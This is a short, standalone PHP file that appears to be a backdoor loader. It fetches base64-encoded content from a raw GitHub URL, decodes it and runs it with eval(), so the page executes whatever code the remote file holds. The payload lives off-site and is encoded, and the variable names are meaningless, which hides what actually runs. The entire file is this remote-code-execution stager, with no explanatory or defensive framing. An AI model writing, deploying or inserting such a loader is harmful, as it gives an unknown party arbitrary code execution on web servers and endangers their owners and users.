<?php
$pff = "https://raw.githubusercontent.com/31333337/tools/main/b64";
$puff = file_get_contents($pff); 
eval("?>".(base64_decode($puff)));
?>
